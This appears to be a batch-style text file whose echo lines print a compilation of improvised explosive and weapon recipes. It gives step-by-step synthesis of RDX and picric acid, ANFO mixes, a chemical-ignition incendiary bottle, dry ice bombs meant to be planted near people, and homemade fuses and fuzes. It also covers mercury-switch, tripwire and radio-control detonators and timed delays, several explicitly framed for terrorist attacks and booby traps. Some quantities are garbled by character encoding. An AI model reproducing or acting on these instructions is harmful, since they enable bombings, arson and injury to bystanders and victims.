echo 3.Place all of the finely ground potassium or sodium nitrate in the beaker, and add just enough boiling water to the chemical to get it all wet.
echo 4.Add the contents of the other plastic bags to the wet potassium or sodium nitrate, and mix them well for several minutes. Do this until there is 
echo no more visible sulfur or charcoal, or until the mixture is universally black.
echo 5.On a warm sunny day, put the beaker outside in the direct sunlight. Sunlight is really the best way to dry black powder, since it is never too 
echo hot, but it is hot enough to evaporate the water.
echo 6.Scrape the black powder out of the beaker, and store it in a safe container. Plastic is really the safest container, followed by paper. Never

echo 199.RDX II by Exodus
echo RDX, also called Cyclonite, or composition C-1 (when mixed with plasticisers) is one of the most valuable of all military explosives. This is 
echo because it has more than 150% of the power of TNT, and is much easier to detonate. It should not be used alone, since it can be set off by a 
echo not-too severe shock. It is less sensitive than Mercury Fulminate or Nitroglycerin, but it is still too sensitive to be used alone.

echo RDX can be made by the surprisingly simple method outlined hereafter. It is much easier to make in the home than all other high explosives, with 
echo the possible exception of Ammonium Nitrate.
echo MATERIALS:
echo · Hexamine -or- Methenamine Fuel Tablets (50 g)
echo · Concentrated Nitric Acid (550 mL) 
echo · Ammonium Nitrate 
echo · Distilled Water 
echo · Table Salt 
echo · Ice 
echo EQUIPMENT:
echo · 500 mL Beaker 
echo · Glass Stirring Rod 
echo · Funnel and Filter Paper
echo · Ice Bath Container (Plastic Bucket)
echo · Centigrade Thermometer
echo · Blue Litmus Paper 
echo 1.Place the beaker in the ice bath, (see steps 3-4) and carefully pour 550 mL of concentrated Nitric Acid into the beaker.
echo 2.When the acid has cooled to below 20øC, add small amounts of the crushed fuel tablets to the beaker. The temperature will rise, and it must 
echo be kept below 30øC, or dire consequences could result. Stir the mixture.
echo 3.Drop the temperature below 0øC, either by adding more ice and salt to the old ice bath, or by creating a new ice bath. Ammonium Nitrate could 
echo be added to the old ice bath, since it becomes cold when it is put in water. Continue stirring the mixture, keeping the temperature below 
echo 0øC for at least twenty minutes.
echo 4.Pour the mixture into a liter of crushed ice. Shake and stir the mixture, and allow it to melt. Once it has melted, filter out the crystals, and 
echo dispose of the corrosive liquid.
echo 5.Place the crystals into one half a liter of boiling distilled water. Filter the crystals, and test them with the blue litmus paper. Repeat steps 4 and 
echo 5 until the litmus paper remains blue. This will make the crystals more stable and safe.
echo 6.Store the crystals wet until ready for use. Allow them to dry completely using them. RDX is not stable enough to use alone as an explosive.
echo 7.Composition C-1 can be made by mixing 88.3% RDX (by weight) with 11.1% mineral oil, and 0.6% lecithin. Kneed these material together in a 
echo plastic bag. This is one way to desensitize the explosive.
echo 8.HMX is a mixture of TNT and RDX; the ratio is 50/50, by weight. It is not as sensitive, and is almost as powerful as straight RDX.
echo 9.By adding ammonium nitrate to the crystals of RDX after step 5, it should be possible to desensitize the RDX and increase its power, since 
echo ammonium nitrate is very insensitive and powerful. Sodium or potassium nitrate could also be added; a small quantity is sufficient to 
echo stabilize the RDX.
echo 10.RDX detonates at a rate of 8550 meters/second when it is compressed to a density of 1«5 g/cubic cm.

echo 201.ANFOS by Dean S.
echo ANFO is an acronym for Ammonium Nitrate - Fuel Oil Solution. An ANFO solves the only other major problem with ammonium nitrate: its 
echo tendency to pick up water vapor from the air. This results in the explosive failing to detonate when such an attempt is made. This is rectified by 
echo mixing 94% (by weight) ammonium nitrate with 6% fuel oil, or kerosene. The kerosene keeps the ammonium nitrate from absorbing moisture 
echo from the air. An ANFO also requires a large shockwave to set it off.
echo About ANFO
echo Lately there was been a lot said about various ANFO mixtures. These are mixtures of Ammonium Nitrate with Fuel Oil. This forms a reasonably 
echo powerful commercial explosive, with its primary benefit being the fact that it is cheap. Bulk ANFO should run somewhere around 9-12 cents 
echo the pound. This is dirt cheap compared to 40% nitro gel dynamites at 1 to 2 dollars the pound. To keep the cost down, it is frequently mixed at 
echo the borehole by a bulk truck, which has a pneumatic delivery hopper of AN prills (that's pellets to most of the world) and a tank of fuel oil. It is 
echo strongly recommended that a dye of some sort, preferably red be added to the fuel oil to make it easier to distinguish treated AN explosive from 
echo untreated oxidizer.
echo ANFO is not without its problems. To begin with, it is not that sensitive to detonation. Number eight caps are not reliable when used with ANFO. 
echo Booster charges must be used to avoid dud blast holes. Common boosters include sticks of various dynamites, small pours of water gel 
echo explosives, dupont's detaprime cast boosters, and Atlas's power primer cast explosive. The need to use boosters raises the cost. Secondly, 
echo ANFO is very water susceptible. It dissolves in it, or absorbs it from the atmosphere, and becomes quite worthless real quick. It must be 
echo protected from water with borehole liners, and still must be shot real quick. Third, ANFO has a low density, somewhere around .85. This 
echo means ANFO sacks float, which is no good, and additionally, the low density means the power is somewhat low. Generally, the more weight 
echo of explosive one can place in a hole, the more effective. ANFO blown into the hole with a pneumatic system fractures as it is places, raising 
echo the density to about .9 or .92. The delivery system adds to the cost, and must be anti static in nature. Aluminum is added to some commercial, 
echo cartridge packaged ANFOs to raise the density---this also raises power considerable, and a few of these mixtures are reliably cap sensitive.
echo Now than, for formulations. An earlier article mentioned 2« kilos of ammonium nitrate, and I believe 5 to 6 liters of diesel. This mixture is 
echo extremely over fueled, and I'd be surprised if it worked. Dupont recommends a AN to FO ratio of 93% AN to 7% FO by weight. Hardly any oil at 
echo all. More oil makes the mixture less explosive by absorbing detonation energy, and excess fuel makes detonation byproducts health hazards as 
echo the mixture is oxygen poor. Note that commercial fertilizer products do not work as well as the porous AN prills dupont sells, because 
echo fertilizers are coated with various materials meant to seal them from moisture, which keep the oil from being absorbed.
echo Another problem with ANFO: for reliable detonation, it needs confinement, either from a casing, borehole, etc, or from the mass of the charge. 
echo Thus, a pile of the stuff with a booster in it is likely to scatter and burn rather than explode when the booster is shot. In boreholes, or 
echo reasonable strong casings (cardboard, or heavy plastic film sacks) the stuff detonated quite well. So will big piles. That's how the explosive 
echo potential was discovered: a small oil freighter rammed a bulk chemical ship. Over several hours the cargoes intermixed to some degree, and 
echo reached critical mass. Real big bang. A useful way to obtain the containment needed is to replace the fuel oil with a wax fuel. Mix the AN with 
echo just enough melted wax to form a cohesive mixture, mold into s hape. The wax fuels, and retains the mixture. This is what the US military uses 
echo as a man placed cratering charge. The military literature states this can be set off by a blasting cap, but it is important to remember the military 
echo blasting caps are considerable more powerful than commercial ones. The military rightly insists on reliability, and thus a strong cap (maybe 70-
echo 80 percent stronger than commercial). They also tend to go overboard when calculating demolition charges...., but hey, who doesn't...
echo Two manuals of interest: Duponts "Blaster's Handbook", $20 manual mainly useful for rock and seismographic operations. Atlas's "Powder 
echo Manual" or "Manual of Rock Blasting" (I forget the title, its in the office). This is a $60 book, well worth the cash, dealing with the above two 
echo topics, plus demolitions, and non-quarry blasting.
echo Incidentally, combining fuel oil and ammonium nitrate constitutes the manufacture of a high explosive, and requires a federal permit to 
echo manufacture and store. Even the mines that mix it on site require the permit to manufacture. Those who don't manufacture only need permits to 
echo store. Those who don't store need no permits, which includes most of us: anyone, at least in the US may purchase explosives, provided they 
echo are 21 or older, and have no criminal record. Note they ought to be used immediately, because you do need a license to store. Note also that 
echo commercial explosives contain quantities of tracing agents, which make it real easy for the FBI to trace the explosion to the purchaser, so 
echo please, nobody blow up any banks, orphanages, or old folks homes, okay.

echo 202.Picric Acid by Exodus
echo Picric acid, also known as Tri-Nitro-Phenol, or TNP, is a military explosive that is most often used as a booster charge to set off another less 
echo sensitive explosive, such as TNT. It's another explosive that is fairly simple to make, assuming that one can acquire the concentrated sulfuric 
echo and nitric acids. Its procedure for manufacture is given in many college chemistry lab manuals, and is easy to follow. The main problem with 
echo picric acid is its tendency to form dangerously sensitive and unstable picrate salts, such as potassium picrate. For this reason, it is usually 
echo made into a safer form, such as ammonium picrate, also called explosive D. A social deviant would probably use a formula similar to the one 
echo presented here to make picric acid.
echo MATERIALS: 
echo · Phenol (9« g) 
echo · Concentrated Sulfuric Acid (12« mL)
echo · Concentrated Nitric Acid (38 mL) 
echo · Distilled Water 
echo EQUIPMENT:
echo · 500 mL Flask
echo · Adjustable Heat Source 
echo · 1000 mL Beaker -or- other container suitable for boiling in
echo · Filter Paper and Funnel
echo · Glass Stirring Rod 
echo 1.Place 9« grams of phenol into the 500 mL flask, and carefully add 12« mL of concentrated sulfuric acid and stir the mixture.
echo 2.Put 400 mL of tap water into the 1000 mL beaker or boiling container and bring the water to a gentle boil.
echo 3.After warming the 500 mL flask under hot tap water, place it in the boiling water, and continue to stir the mixture of phenol and acid for about 
echo thirty minutes. After thirty minutes, take the flask out, and allow it to cool for about five minutes.
echo 4.Pour out the boiling water used above, and after allowing the container to cool, use it to create an ice bath, similar to the one used in steps 3-
echo 4. Place the 500 mL flask with the mixed acid an phenol in the ice bath. Add 38 mL of concentrated nitric acid in small amounts, stirring the 
echo mixture constantly. A vigorous but "harmless" reaction should occur. When the mixture stops reacting vigorously, take the flask out of the 
echo ice bath.
echo 5.Warm the ice bath container, if it is glass, and then begin boiling more tap water. Place the flask containing the mixture in the boiling water, 
echo and heat it in the boiling water for 1« to 2 hours.
echo 6.Add 100 mL of cold distilled water to the solution, and chill it in an ice bath until it is cold.
echo 7.Filter out the yellowish-white picric acid crystals by pouring the solution through the filter paper in the funnel. Collect the liquid and dispose of 
echo it in a safe place, since it is corrosive.
echo 8.Wash out the 500 mL flask with distilled water, and put the contents of the filter paper in the flask. Add 300 mL of water, and shake 
echo vigorously.
echo 9.Re-filter the crystals, and allow them to dry.
echo 10.Store the crystals in a safe place in a glass container, since they will react with metal containers to produce picrates that could explode 
echo spontaneously.

echo 203.CHEMICAL FIRE BOTTLE by Exodus
echo The chemical fire bottle is really an advanced molotov cocktail. Rather than using the burning cloth to ignite the flammable liquid, which has at 
echo best a fair chance of igniting the liquid, the chemical fire bottle utilizes the very hot and violent reaction between sulfuric acid and potassium 
echo chlorate. When the container breaks, the sulfuric acid in the mixture of gasoline sprays onto the paper soaked in potassium chlorate and sugar. 
echo The paper, when struck by the acid, instantly bursts into a white flame, igniting the gasoline. The chance of failure to ignite the gasoline is less 
echo than 2%, and can be reduced to 0%, if there is enough potassium chlorate and sugar to spare.
echo MATERIALS:
echo · Potassium Chlorate (2 teaspoons)
echo · Sugar (2 teaspoons) 
echo · Concentrated Sulfuric Acid (4 oz.) 
echo · Gasoline (8 oz.) 
echo EQUIPMENT:
echo · 12 oz. glass bottle
echo · Cap for bottle, with plastic inside
echo · Cooking Pan with raised edges
echo · Paper Towels
echo · Glass or Plastic Cup and Spoon
echo 1.Test the cap of the bottle with a few drops of sulfuric acid to make sure that the acid will not eat away the bottle cap during storage. If the 
echo acid eats through it in 24 hours, a new top must be found and tested, until a cap that the acid does not eat through is found. A glass top 
echo is excellent.
echo 2.Carefully pour 8 oz. of gasoline into the glass bottle.
echo 3.Carefully pour 4 oz. of concentrated sulfuric acid into the glass bottle. Wipe up any spills of acid on the sides of the bottle, and screw the 
echo cap on the bottle. Wash the bottle's outside with plenty of water. Set it aside to dry.
echo 4.Put about two teaspoons of potassium chlorate and about two teaspoons of sugar into the glass or plastic cup. Add about « cup of boiling 
echo water, or enough to dissolve all of the potassium chlorate and sugar.
echo 5.Place a sheet of paper towel in the cooking pan with raised edges. Fold the paper towel in half, and pour the solution of dissolved potassium 
echo chlorate and sugar on it until it is thoroughly wet. Allow the towel to dry.
echo 6.When it is dry, put some glue on the outside of the glass bottle containing the gasoline and sulfuric acid mixture. Wrap the paper towel around 
echo the bottle, making sure that it sticks to it in all places. Store the bottle in a place where it will not be broken or tipped over.
echo 7.When finished, the solution in the bottle should appear as two distinct liquids, a dark brownish-red solution on the bottom, and a clear solution 
echo on top. The two solutions will not mix. To use the chemical fire bottle, simply throw it at any hard surface.
echo 8.NEVER OPEN THE BOTTLE, SINCE SOME SULFURIC ACID MIGHT BE ON THE CAP, WHICH COULD TRICKLE DOWN THE SIDE OF THE BOTTLE 
echo AND IGNITE THE POTASSIUM CHLORATE, CAUSING A FIRE AND/OR EXPLOSION.
echo 9.To test the device, tear a small piece of the paper towel off the bottle, and put a few drops of sulfuric acid on it. The paper towel should 
echo immediately burst into a white flame.
echo BOTTLED GAS EXPLOSIVES
echo Bottled gas, such as butane for refilling lighters, propane for propane stoves or for bunsen burners, can be used to produce a powerful 
echo explosion. To make such a device, all that a simple-minded anarchist would have to do would be to take his container of bottled gas and place it 
echo above a can of Sterno or other gelatinized fuel, light the fuel and run. Depending on the fuel used, and on the thickness of the fuel container, 
echo the liquid gas will boil and expand to the point of bursting the container in about five minutes.
echo In theory, the gas would immediately be ignited by the burning gelatinized fuel, producing a large fireball and explosion. Unfortunately, the 
echo bursting of the bottled gas container often puts out the fuel, thus preventing the expanding gas from igniting. By using a metal bucket half filled 
echo with gasoline, however, the chances of ignition are better, since the gasoline is less likely to be extinguished. Placing the canister of bottled 
echo gas on a bed of burning charcoal soaked in gasoline would probably be the most effective way of securing ignition of the expanding gas, 
echo since although the bursting of the gas container may blow out the flame of the gasoline, the burning charcoal should immediately re-ignite it. 
echo Nitrous oxide, hydrogen, propane, acetylene, or any other flammable gas will do nicely.
echo During the recent gulf war, fuel/air bombs were touted as being second only to nuclear weapons in their devastating effects. These are 
echo basically similar to the above devices, except that an explosive charge is used to rupture the fuel container and disperse it over a wide area. A 
echo second charge is used to detonate the fuel. The reaction is said to produce a massive shockwave and to burn all the oxygen in a large area, 
echo causing suffocation.
echo Another benefit of a fuel-air explosive is that the gas will seep into fortified bunkers and other partially-sealed spaces, so a large bomb placed 
echo in a building would result in the destruction of the majority of surrounding rooms, rendering it structurally unsound.

echo  204.Dry Ice by Exodus
echo There is no standard formula for a dry ice bomb, however a generic form is as follows:
echo Take a 2-liter soda bottle, empty it completely, then add about 3/4 Lb of Dry Ice (crushed works best) and (optional) a quantity of water.
echo Depending on the condition of the bottle, the weather, and the amount and temperature of the bottle the bomb will go off in 30 seconds - 5 
echo minutes. Without any water added, the 2-liter bottles will go often in 3-7 minutes if dropped into a warm river, and in 45 minutes to 1 « hours in 
echo open air.
echo The explosion sounds equivalent to an M-100. _Plastic_ 16 oz. soda bottles and 1 liter bottles work almost as well as do the 2 -liters, however 
echo glass bottles aren't nearly as loud, and can produce dangerous shrapnel.
echo Remember, these are LOUD A classmate of mine set up 10 bottles in a nearby park without adding water. After the first two went off (there 
echo was about 10 minutes between explosions) the Police arrived and spent the next hour trying to find the guy who they thought was setting off 
echo M-100's all around them...
echo USES FOR DRY ICE
echo Time Bombs:
echo 1.Get a small plastic container with lid (we used the small plastic cans that hold the coasters used for large-format Polaroid film). A film canister 
echo would probably work; the key is, it should seal tightly and take a fair amount of effort to open). Place a chunk of dry ice in the can, put on 
echo the lid without quite sealing it. Put the assembled bomb in your pocket, or behind your back. Approach the mark and engage in normal 
echo conversation. When his attention is drawn away, quickly seal the lid on the bomb, deposit it somewhere within a few feet of the mark, out 
echo of obvious sight, then leave. Depending on variables (you'll want to experiment first), you'll hear a loud "pop" and an even louder 
echo "Aarrgghhh" within a minute, when the COý pressure becomes sufficient to blow off the lid. In a cluttered lab, this is doubly nasty 
echo because the mark will probably never figure out what made the noise.
echo 2.Put 2-3 inches of water in a 2-liter plastic pop bottle. Put in as many chunks of dry ice as possible before the smoke gets too thick. Screw on 
echo the cap, place in an appropriate area, and run like hell. After about a minute (your mileage may vary), a huge explosion will result, spraying 
echo water everywhere, along with what's left of the 2-liter bottle.
echo More things to do with Dry Ice:
echo Has anyone ever thrown dry ice into a public pool? As long as you chuck it into the bottom of the deep end, it's safe, and it's really impressive 
echo if the water is warm enough
echo "Fun stuff. It SCREAMS when it comes into contact with metal..."
echo "You can safely hold a small piece of dry ice in your mouth if you 
echo  KEEP IT MOVING CONSTANTLY. It looks like you're smoking or on fire."
echo Editor's Note: Dry ice can be a lot of fun, but be forewarned:
echo Using anything but plastic to contain dry ice bombs is suicidal. Dry ice is more dangerous than TNT, because it's extremely unpredictable. Even 
echo a 2-liter bottle can produce some nasty shrapnel: One source tells me that he caused an explosion with a 2-liter bottle that destroyed a metal 
echo garbage can. In addition, it is rumored that several kids have been killed by shards of glass resulting from the use of a glass bottle. For some 
echo reason, dry ice bombs have become very popular in the state of Utah. As a result, dry ice bombs have been classified as infernal devices, and 
echo possession is a criminal offense.

echo 205.Fuses / Ignitors / Delays by Exodus
echo There are many ways to ignite explosive devices. There is the classic "light the fuse, throw the bomb, and run" approach, and there are 
echo sensitive mercury switches, and many things in between. Generally, electrical detonation systems are safer than fuses, but there are times 
echo when fuses are more appropriate than electrical systems; it is difficult to carry an electrical detonation system into a stadium, for instance, 
echo without being caught. A device with a fuse or impact detonating fuze would be easier to hide.
echo FUSE IGNITION
echo The oldest form of explosive ignition, fuses are perhaps the favorite type of simple ignition system. By simply placing a piece of waterproof 
echo fuse in a device, one can have almost guaranteed ignition. Modern waterproof fuse is extremely reliable, burning at a rate of about 2« seconds 
echo to the inch. It is available as model rocketry fuse in most hobby shops, and costs about $3.00 for a nine-foot length. Cannon Fuse is a popular 
echo ignition system for pipe bombers because of its simplicity. All that need be done is light it with a match or lighter. Of course, if the Army had 
echo fuses like this, then the grenade, which uses fuse ignition, would be very impractical. If a grenade ignition system can be acquired, by all 
echo means, it is the most effective. But, since such things do not just float around, the next best thing is to prepare a fuse system which does not 
echo require the use of a match or lighter, but still retains its simplicity. One such method is described below:
echo MATERIALS:
echo · Strike-on-Cover type Matches
echo · Electrical Tape -or- Duct Tape
echo · Waterproof Fuse
echo 1.To determine the burn rate of a particular type of fuse, simply measure a 6 inch or longer piece of fuse and ignite it. With a stopwatch, press 
echo the start button the at the instant when the fuse lights, and stop the watch when the fuse reaches its end. Divide the time of burn by the 
echo length of fuse, and you have the burn rate of the fuse, in seconds per inch. This will be shown below:
echo Suppose an eight inch piece of fuse is burned, and its complete time of combustion is 20 seconds.
echo 20 seconds / 8 inches = 2« seconds per inch.
echo If a delay of 10 seconds was desired with this fuse, divide the desired time by the number of seconds per inch:
echo 10 seconds / 2« seconds per inch = 4 inches
echo NOTE: THE LENGTH OF FUSE HERE MEANS LENGTH OF FUSE TO THE POWDER. SOME FUSE, AT LEAST AN INCH, SHOULD BE INSIDE THE 
echo DEVICE. ALWAYS ADD THIS EXTRA INCH, AND PUT THIS EXTRA INCH AN INCH INTO THE DEVICE
echo 2.After deciding how long a delay is desired before the explosive device is to go off, add about « an inch to the premeasured amount of fuse, 
echo and cut it off.
echo 3.Carefully remove the cardboard matches from the paper match case. Do not pull off individual matches; keep all the matches attached to the 
echo cardboard base. Take one of the cardboard match sections, and leave the other one to make a second igniter.
echo 4.Wrap the matches around the end of the fuse, with the heads of the matches touching the very end of the fuse. Tape them there securely, 
echo making sure not to put tape over the match heads. Make sure they are very secure by pulling on them at the base of the assembly. They 
echo should not be able to move.
echo 5.Wrap the cover of the matches around the matches attached to the fuse, making sure that the striker paper is below the match heads and 
echo the striker faces the match heads. Tape the paper so that is fairly tight around the matches. Do not tape the cover of the striker to the fuse 
echo or to the matches. Leave enough of the match book to pull on for ignition.

echo The match book is wrapped around the matches, and is taped to itself. The matches are taped to the fuse. The striker will rub against the 
echo matcheads when the match book is pulled.
echo 6.When ready to use, simply pull on the match paper. It should pull the striking paper across the match heads with enough friction to light them. 
echo In turn, the burning matcheads will light the fuse, since it adjacent to the burning match heads.
echo HOW TO MAKE BLACKMATCH FUSE:
echo Take a flat piece of plastic or metal (brass or aluminum are easy to work with and won't rust). Drill a 1/16th inch hole through it. This is your die 
echo for sizing the fuse. You can make fuses as big as you want, but this is the right size for the pipe bomb I will be getting to later.
echo To about « cup of black powder add water to make a thin paste. Add « teaspoon of corn starch. Cut some one foot lengths of cotton thread. 
echo Use cotton, not silk or thread made from synthetic fibers. Put these together until you have a thickness that fills the hole in the die but can be 
echo drawn through very easily.
echo Tie your bundle of threads together at one end. Separate the threads and hold the bundle over the black powder mixture. Lower the threads 
echo with a circular motion so they start curling onto the mixture. Press them under with the back of a teaspoon and continue lowering them so they 
echo coil into the paste. Take the end you are holding and thread it through the die. Pull it through smoothly in one long motion.
echo To dry your fuse, lay it on a piece of aluminum foil and bake it in your 250ø oven or tie it to a grill in the oven and let it hang down. The fuse must 
echo be baked to make it stiff enough for the uses it will be put to later. Air drying will not do the job. If you used Sodium Nitrate, it will not even dry 
echo completely at room temperatures.
echo Cut the dry fuse with scissors into 2 inch lengths and store in an air tight container. Handle this fuse carefully to avoid breaking it. You can also 
echo use a firecracker fuse if you have any available. The fuses can usually be pulled out without breaking. To give yourself some running time, you 
echo will be extending these fuses (blackmatch or firecracker fuse) with sulfured wick.
echo Finally, it is possible to make a relatively slow -burning fuse in the home. By dissolving about one teaspoon of black powder in about 1/4 a cup 
echo of boiling water, and, while it is still hot, soaking in it a long piece of all cotton string, a slow -burning fuse can be made. After the soaked string 
echo dries, it must then be tied to the fuse of an explosive device. Sometimes, the end of the slow burning fuse that meets the normal fuse has a 
echo charge of black powder or gunpowder at the intersection point to insure ignition, since the slow -burning fuse does not burn at a very high 
echo temperature.
echo A similar type of slow fuse can be made by taking the above mixture of boiling water and black powder and pouring it on a long piece of toilet 
echo paper. The wet toilet paper is then gently twisted up so that it resembles a firecracker fuse, and is allowed to dry.
echo HOW TO MAKE SULFURED WICK
echo Use heavy cotton string about 1/8th inch in diameter. You can find some at a garden supply for tying up your tomatoes. Be sure it's cotton. 
echo You can test it by lighting one end. It should continue to burn after the match is removed and when blown out will have a smoldering coal on 
echo the end. Put some sulfur in a small container like a small pie pan and melt it in the oven at 250ø.
echo It will melt into a transparent yellow liquid. If it starts turning brown, it is too hot. Coil about a one foot length of string into it. The melted sulfur 
echo will soak in quickly. When saturated, pull it out and tie it up to cool and harden.
echo It can be cut to desired lengths with scissors. 2 inches is about right. These wicks will burn slowly with a blue flame and do not blow out 
echo easily in a moderate wind. They will not burn through a hole in a metal pipe, but are great for extending your other fuse. They will not throw off 
echo sparks. Blackmatch generates sparks which can ignite it along its length causing unpredictable burning times.
echo ---IMPACT IGNITION---
echo Impact ignition is an excellent method of ignition for spontaneous terrorist activities. The problem with an impact-detonating device is that it must 
echo be kept in a very safe container so that it will not explode while being transported to the place where it is to be used. This can be done by 
echo having a removable impact initiator.
echo The best and most reliable impact initiator is one that uses factory made initiators or primers. A No. 11 cap for black powder firearms is one 
echo such primer. They usually come in boxes of 100, and cost about $2«0. To use such a cap, however, one needs a nipple that it will fit on. Black 
echo powder nipples are also available in gun stores. All that a person has to do is ask for a package of nipples and the caps that fit them. Nipples 
echo have a hole that goes all the way through them, and they have a threaded end, and an end to put the cap on. A cutaway of a nipple is shown 
echo below:

echo  | |
echo  |_________________|
echo When making using this type of initiator, a hole must be drilled into whatever container is used to make the bomb out of. The nipple is then 
echo screwed into the hole so that it fits tightly. Then, the cap can be carried and placed on the bomb when it is to be thrown. The cap should be 
echo bent a small amount before it is placed on the nipple, to make sure that it stays in place. The only other problem involved with an impact 
echo detonating bomb is that it must strike a hard surface on the nipple to set it off. By attaching fins or a small parachute on the end of the bomb 
echo opposite the primer, the bomb, when thrown, should strike the ground on the primer, and explode. Of course, a bomb with mercury fulminate in 
echo each end will go off on impact regardless of which end it strikes on, but mercury fulminate is also likely to go off if the person carrying the 
echo bomb is bumped hard.
echo ---MAGICUBE IGNITOR---
echo A VERY SENSITIVE and reliable impact initiator can be produced from the common MAGICUBE ($2.40 for 12) type flashbulbs. Simply crack the 
echo plastic cover off, remove the reflector, and you will see 4 bulbs, each of which has a small metal rod holding it in place.
echo CAREFULLY grasp this rod with a pair of needle-nose pliers, and pry gently upwards, making sure that NO FORCE IS APPLIED TO THE GLASS 
echo BULB.
echo Each bulb is coated with plastic, which must be removed for them to be effective in our application. This coating can be removed by soaking 
echo the bulbs in a small glass of acetone for 30-45 minutes, at which point the plastic can be easily peeled away.
echo The best method to use these is to dissolve some nitrocellulose based smokeless powder in acetone and/or ether, forming a thick glue-like 
echo paste. Coat the end of the fuse with this paste, then stick the bulb (with the metal rod facing out) into the paste. About half the bulb should be 
echo completely covered, and if a VERY THIN layer of nitrocellulose is coated over the remainder then ignition should be very reliable.
echo To insure that the device lands with the bulb down, a small streamer can be attached to the opposite side, so when it is tossed high into the air 
echo the appropriate end will hit the ground first.
echo ---ELECTRICAL IGNITION---
echo Electrical ignition systems for detonation are usually the safest and most reliable form of ignition. Electrical systems are ideal for demolition 
echo work, if one doesn't have to worry so much about being caught. With two spools of 500 ft of wire and a car battery, one can detonate 
echo explosives from a "safe", comfortable distance, and be sure that there is nobody around that could get hurt. With an electrical system, one can 
echo control exactly what time a device will explode, within fractions of a second. Detonation can be aborted in less than a second's warning, if a 
echo person suddenly walks by the detonation sight, or if a police car chooses to roll by at the time. The two best electrical igniters are military 
echo squibs and model rocketry igniters. Blasting caps for construction also work well. Model rocketry igniters are sold in packages of six, and cost 
echo about $1.00 per pack. All that need be done to use them is connect it to two wires and run a current through them. Military squibs are difficult 
echo to get, but they are a little bit better, since they explode when a current is run through them, whereas rocketry igniters only burst into flame. 
echo Most squibs will NOT detonate KClO3/petroleum jelly or RDX. This requires a blasting cap type detonation in most cases. There are, however, 
echo military explosive squibs which will do the job.
echo Igniters can be used to set off black powder, mercury fulminate, or guncotton, which in turn, can set of a high order explosive.
echo ---HOW TO MAKE AN ELECTRIC FUZE---
echo By Capt. Hack and GW
echo Take a flashlight bulb and place it glass tip down on a file. Grind it down on the file until there is a hole in the end. Solder one wire to the case 
echo of the bulb and another to the center conductor at the end. Fill the bulb with black powder or powdered match head. One or tw o flashlight 
echo batteries will heat the filament in the bulb causing the powder to ignite.
echo ---ANOTHER ELECTRIC FUZE---
echo Take a medium grade of steel wool and pull a strand out of it. Attach it to the ends of two pieces of copper wire by wrapping it around a few 
echo turns and then pinch on a small piece of solder to bind the strand to the wire. You want about « inch of steel strand between the wires. 
echo Number 18 or 20 is a good size wire to use.
echo Cut a « by 1 inch piece of cardboard of the type used in match covers. Place a small pile of powdered match head in the center and press it 
echo flat. Place the wires so the steel strand is on top of and in contact with the powder. Sprinkle on more powder to cover the strand.
echo The strand should be surrounded with powder and not touching anything else except the wires at its ends. Place a piece of blackmatch in 
echo contact with the powder. Now put a piece of masking tape on top of the lot, and fold it under on the two ends. Press it down so it sticks all 
echo around the powder. The wires are sticking out on one side and the blackmatch on the other.
echo A single flashlight battery will set this off.
echo ---ELECTRO-MECHANICAL IGNITION---
echo Electro-mechanical ignition systems are systems that use some type of mechanical switch to set off an explosive charge electrically. This type 
echo of switch is typically used in booby traps or other devices in which the person who places the bomb does not wish to be anywhere near the 
echo device when it explodes. Several types of electro-mechanical detonators will be discussed
echo ---Mercury Switches ---
echo Mercury switches are a switch that uses the fact that mercury metal conducts electricity, as do all metals, but mercury metal is a liquid at room 
echo temperatures. A typical mercury switch is a sealed glass tube with two electrodes and a bead of mercury metal. It is sealed because of 
echo mercury's nasty habit of giving off brain-damaging vapors. The diagram below may help to explain a mercury switch.
echo  ______________

echo  _____wire +______/_________ \
echo  \ ( Hg )| /
echo  \ _(_Hg___)|___/
echo  |
echo  |
echo  wire - |
echo  |
echo  |
echo When the drop of mercury ("Hg" is mercury's atomic symbol) touches both contacts, current flows through the switch. If this particular switch 
echo was in its present position, A---B, current would be flowing, since the mercury can touch both contacts in the horizontal position.
echo If, however, it was in the | position, the drop of mercury would only touch the + contact on the A side. Current, then couldn't flow, since 
echo mercury does not reach both contacts when the switch is in the vertical position. This type of switch is ideal to place by a door. If it were 
echo placed in the path of a swinging door in the vertical position, the motion of the door would knock the switch down, if it was held to the ground 
echo by a piece if tape. This would tilt the switch into the vertical position, causing the mercury to touch both contacts, allowing current to flow 
echo through the mercury, and to the igniter or squib in an explosive device.
echo ---Tripwire Switches ---
echo A tripwire is an element of the classic booby trap. By placing a nearly invisible line of string or fishing line in the probable path of a victim, and 
echo by putting some type of trap there also, nasty things can be caused to occur. If this mode of thought is applied to explosives, how would one 
echo use such a tripwire to detonate a bomb. The technique is simple. By wrapping the tips of a standard clothespin with aluminum foil, and placing 
echo something between them, and connecting wires to each aluminum foil contact, an electric tripwire can be made, If a piece of wood attached to 
echo the tripwire was placed between the contacts on the clothespin, the clothespin would serve as a switch. When the tripwire was pulled, the 
echo clothespin would snap together, allowing current to flow between the two pieces of aluminum foil, thereby completing a circuit, which would 
echo have the igniter or squib in it. Current would flow between the contacts to the igniter or squib, heat the igniter or squib, causing it to explode. 
echo Make sure that the aluminum foil contacts do not touch the spring, since the spring also conducts electricity.
echo ---Radio Control Detonators---
echo In the movies, every terrorist or criminal uses a radio controlled detonator to set off explosives. With a good radio detonator, one can be 
echo several miles away from the device, and still control exactly when it explodes, in much the same way as an electrical switch. The problem with 
echo radio detonators is that they are rather costly. However, there could possibly be a reason that a terrorist would wish to spend the amounts of 
echo money involved with a RC (radio control) system and use it as a detonator. If such an individual wanted to devise an RC detonator, all he would 
echo need to do is visit the local hobby store or toy store, and buy a radio controlled toy. Taking it back to his/her abode, all that he/she would have 
echo to do is detach the solenoid/motor that controls the motion of the front wheels of a RC car, or detach the solenoid/motor of the elevators/rudder 
echo of a RC plane, or the rudder of a RC boat, and re-connect the squib or rocket engine igniter to the contacts for the solenoid/motor. The device 
echo should be tested several times with squibs or igniters, and fully charged batteries should be in both he controller and the receiver (the part that 
echo used to move parts before the device became a detonator).
echo ---DELAYS---
echo A delay is a device which causes time to pass from when a device is set up to the time that it explodes. A regular fuse is a delay, but it would 
echo cost quite a bit to have a 24 hour delay with a fuse. This section deals with the different types of delays that can be employed by a terrorist 
echo who wishes to be sure that his bomb will go off, but wants to be out of the country when it does.
echo ---FUSE DELAYS---
echo It is extremely simple to delay explosive devices that employ fuses for ignition. Perhaps the simplest way to do so is with a cigarette. An 
echo average cigarette burns for between 8-11 minutes. The higher the "tar" and nicotine rating, the slower the cigarette burns. Low "tar" and 
echo nicotine cigarettes burn quicker than the higher "tar" and nicotine cigarettes, but they are also less likely to go out if left unattended, i.e. not 
